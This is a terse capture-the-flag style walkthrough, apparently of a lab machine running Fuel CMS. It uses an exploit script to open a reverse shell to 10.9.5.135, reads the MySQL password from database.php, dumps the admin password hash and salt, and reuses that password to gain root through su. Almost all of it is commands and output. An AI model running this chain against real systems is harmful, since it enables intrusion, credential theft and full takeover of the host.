1. Get shell
```
$ python 47138.py
cmd: bash -c "bash -i >& /dev/tcp/10.9.5.135/13337 0>&1"
```
2. Found MySQL running
```
$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN
```
3. Found MySQL credential
```
$ cat /var/www/html/fuel/application/config/database.php
...
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
```
4. Get admin password from MySQL
```
mysql> select * from fuel_schema.fuel_users;
select * from fuel_schema.fuel_users;
+----+-----------+------------------------------------------+-------+------------+-----------+----------+-----------+----------------------------------+-------------+--------+
| id | user_name | password                                 | email | first_name | last_name | language | reset_key | salt                             | super_admin | active |
+----+-----------+------------------------------------------+-------+------------+-----------+----------+-----------+----------------------------------+-------------+--------+
|  1 | admin     | 1c186797f1d570686ccd2e921efe612f76c35b7b |       |            |           | english  |           | 455cb9ab79c6652b5b2a324ce4885445 | yes         | yes    |
+----+-----------+------------------------------------------+-------+------------+-----------+----------+-----------+----------------------------------+-------------+--------+
```
5. Use `mememe` from `database.php` to become root.
```
$ su root
Password: mememe
# whoami
root
```
